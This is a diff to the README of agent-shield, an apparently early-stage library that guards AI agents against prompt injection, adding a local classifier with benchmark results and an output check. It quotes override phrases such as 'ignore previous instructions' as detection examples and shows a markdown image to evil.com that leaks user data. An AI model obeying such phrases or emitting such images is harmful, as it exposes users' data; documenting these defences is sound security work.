@@ -2,7 +2,7 @@
 
 Stop AI agents from being tricked by hidden instructions in web pages, emails and files.
 
-> **Status:** early work in progress. Check In (cleaning incoming content) and Check Out (tool-call rules) work today. The classifier and the red-team agent are coming next. Not on npm yet.
+> **Status:** early work in progress. Check In, Check Out, approvals, the optional local classifier and the output check work today. The red-team agent is coming next. Not on npm yet.
 
 ## The problem
 
@@ -28,6 +28,7 @@ agent-shield wraps your agent's tools and does two checks.
 - removes invisible unicode, including "tag" characters used to smuggle hidden messages
 - decodes base64, hex and URL-encoded text and scans it too
 - flags common attack phrases ("ignore previous instructions", "you are now…", fake `system:` lines, "don't tell the user"…)
+- optionally runs a small **local AI classifier** that catches reworded attacks the phrase rules miss (see [Classifier](#classifier))
 - wraps the result as `<untrusted source="tool:fetch_page">…</untrusted>` so the model treats it as data
 
 **Check Out** checks every tool call before it runs:
@@ -87,7 +88,10 @@ const result = await shield.guard("send_email", args, () => sendEmail(args), ses
 // result.ok ? result.value : result.message
 
 // content that doesn't come from a tool (RAG chunks, emails…)
-const safeText = shield.checkIn(emailHtml, { source: "email:inbox", sessionId });
+const safeText = await shield.checkIn(emailHtml, { source: "email:inbox", sessionId });
+
+// the agent's final answer, before you show it: removes images that leak data to other sites
+const shown = shield.checkOutput(answer, { sessionId });
 ```
 
 ## Config
@@ -98,6 +102,9 @@ mode: enforce            # or "monitor": log what would be blocked, block nothin
 checkIn:
   enabled: true
   onFlagged: label       # label (keep + mark high risk) | redact (remove flagged sentences) | drop (remove all)
+
+output:
+  allowImageDomains: ["cdn.mycompany.com"]
 
 tools:
   fetch_page:
@@ -145,6 +152,59 @@ Every tool also gets:
 
 Tools not listed in the config are treated as `risky`.
 
+## Classifier
+
+Phrase rules only catch known wordings. The optional classifier is a small AI model that runs **on your machine** (no API key, no cost) and catches reworded attacks.
+
+```bash
+npm install @huggingface/transformers
+```
+
+```ts
+import { createClassifier } from "agent-shield/classifier";
+
+const classifier = createClassifier();   // Horizon-Labs prompt-injection-guard-small
+await classifier.warmup();               // optional: download + load at startup, not on the first tool call
+const shield = createShield({ config, classifier });
+```
+
+- The model (~268 MB) downloads once on first use and is cached in `~/.cache/agent-shield`. It's pinned to a fixed version, so an upstream change can't silently swap it.
+- Offline? Run `warmup()` once on a machine with internet, copy the cache folder, then use `createClassifier({ offline: true, cacheDir })`.
+- It only uses per-call settings, so your app's own transformers.js setup isn't changed.
+- Long content is read in overlapping chunks, so an attack at the bottom of a long page is still seen.
+- If the model fails or takes longer than `checkIn.classifierTimeoutMs` (10 s), it's skipped with a warning. The content is still marked untrusted, so Check Out keeps protecting.
+- Bring your own: any `async (text) => ({ score })` function works, with an optional `.threshold`.
+
+### How we picked the default
+
+We tested 3 local models on our own set of 40 indirect attacks + 40 normal items (including tricky ones like security blogs that quote attacks). The rule for picking the winner was written before running: each model's threshold is set so **the model alone** has ≤5% false alarms; the winner catches the most attacks together with the phrase rules; ties go to the smaller, faster model.
+
+| | Attacks caught | False alarms | Download | Speed | License |
+|---|---|---|---|---|---|
+| Phrase rules only | 10/40 (25%) | 1/40 | - | instant | - |
+| + ProtectAI DeBERTa v2 | 24/40 (60%) | 6/40 | 739 MB | 52 ms | Apache-2.0 |
+| **+ Horizon-Labs guard small (default)** | **38/40 (95%)** | **3/40** | **268 MB** | **42 ms** | **Apache-2.0** |
+| + Meta Prompt Guard 2 86M | 14/40 (35%) | 1/40 | 281 MB | 29 ms | Llama 4 |
+
+Read this honestly:
+
+- On a public set of mostly *direct* attacks (deepset/prompt-injections, partly German), every model caught only **7–30%**. 95% is a result on our own small set, not a general promise.
+- The default's 3 false alarms are a security blog quoting an attack (phrase rules), a `curl … | bash` install line, and a `role: 'assistant'` config line (model). With `onFlagged: drop`, those pages would be removed completely, which is why the default is `label`.
+
+Full results and caveats: [bench/results.md](bench/results.md). Run it yourself with `npm run bench` (downloads ~1.3 GB of models). This is a small set; M6 grows it to ~400 items.
+
+## Output check
+
+Agents can be tricked into putting an image like `![](https://evil.com/p.png?d=<your data>)` in their answer. The chat UI loads the image, and the data is gone. No tool call needed.
+
+`shield.checkOutput(answer)` cleans the final answer before you show it:
+
+- removes images (markdown, reference-style and `<img>`) to sites not in `output.allowImageDomains`
+- removes links that carry encoded data
+- hides secrets
+
+> Your app must call `checkOutput` on the final answer itself. A LangChain middleware that does it automatically is planned.
+
 ## Asking a human
 
 When a risky call needs approval, the shield calls your `onApproval` function. If there's no approver, the call is blocked. Terminal and callback approvers that don't answer in 5 minutes (`defaults.approvalTimeoutMs`) are blocked too. LangGraph interrupts have no timeout: the run stays paused until you resume it.
@@ -187,7 +247,7 @@ createShield({ config, onApproval: async (req) => (await askOnSlack(req.summary)
 - [x] M2: Check Out: tool rules, taint, secret check, approvals, logging
 - [x] M3: Check In: strip hidden text, decode encodings, detect attack patterns
 - [x] M4: Approvals (terminal, LangGraph interrupt, callback), lockdown, data-in-URL check
-- [ ] M5: Local classifier + output check (markdown image leaks)
+- [x] M5: Local classifier (benchmarked, Horizon-Labs guard small by default) + output check (markdown image leaks)
 - [ ] M6: Test set + published scores
 - [ ] M7: Mastra adapter, npm release
 - [ ] M8: Red-team agent that attacks the shield
